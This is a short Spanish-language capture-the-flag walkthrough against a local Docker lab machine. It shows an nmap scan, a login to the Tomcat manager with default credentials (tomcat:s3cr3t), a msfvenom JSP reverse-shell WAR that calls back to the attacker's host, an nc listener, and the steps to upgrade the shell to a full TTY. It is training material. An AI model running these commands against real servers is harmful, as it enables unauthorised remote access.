Fecha: 07/09/2024

Empiezo usando nmap: 

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

![](imágenes/Pasted%20image%2020240907204742.png)

Me descargo el archivo:
![](imágenes/Pasted%20image%2020240907204853.png)

El contenido parece indicar que hay un usuario llamado tomcat: 
![](imágenes/Pasted%20image%2020240907204916.png)

Usaré ese usuario en manager app, probando las contraseñas que encontré en [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat):

![](imágenes/Pasted%20image%2020240907210520.png)

tomcat:s3cr3t es la que funciona. 

Veo que puedo subir archivos ".war", y en la misma página veo que puedo usarlo para subir una reverse shell:
![](imágenes/Pasted%20image%2020240907210938.png)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=9001 -f war -o revshell.war
```

Hago `nc -lnvp 9001`, a /revshell/ y ya tengo una reverse shell:

![](imágenes/Pasted%20image%2020240907211518.png)

Realmente ya estaría porque soy root, pero podría tratar la tty para que fuera más cómodo: 
```bash
# Empezando desde la reverse shell:
script /dev/null -c bash

Control Z 

stty raw -echo; fg

reset xterm

export TERM=xterm
```

![](imágenes/Pasted%20image%2020240907211628.png)
